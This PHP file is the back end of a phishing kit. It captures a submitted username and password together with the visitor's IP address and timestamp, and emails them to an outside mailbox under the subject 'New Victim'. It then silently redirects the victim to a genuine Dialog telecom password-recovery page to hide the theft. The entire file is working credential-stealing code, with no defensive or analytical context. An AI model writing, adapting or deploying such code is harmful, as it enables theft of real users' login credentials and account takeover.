<?php
#user credetials captured
$username = $_POST["textUsername"]; # captured usernme 
$password = $_POST["textPassword"]; # captured password 
$userIp = $_SERVER['REMOTE_ADDR']; # captured IP 
$captureTime = date("F j, Y, g:i a"); # captured Date/Time 

# sending a mail to admin regarfing the details
$to = "hibchueswc@12storage.com";
$subject = "New Victim";

$headers = "From: hibchueswc@12storage.com" . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$message = '<html><body>';
$message = "<h1> Hi, you have one Access Credential </h1>";
$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
$message .= "<tr style='background: #eee;'><td><strong>User Name : </strong> </td><td>" .$username . "</td></tr>";
$message .= "<tr><td><strong>Password:</strong> </td><td>" . $password . "</td></tr>";
$message .= "<tr><td><strong>IP:</strong> </td><td>" . $userIp . "</td></tr>";
$message .= "<tr><td><strong>Time:</strong> </td><td>" . $captureTime . "</td></tr>";
$message .= "</table>";
$message .= "</body></html>";


mail($to,$subject,$message,$headers);
 
header("Refresh:0; url=https://connect.dialog.lk/DialogConnect/forgotUnamePw.jsp?appId=NeSelf");
?>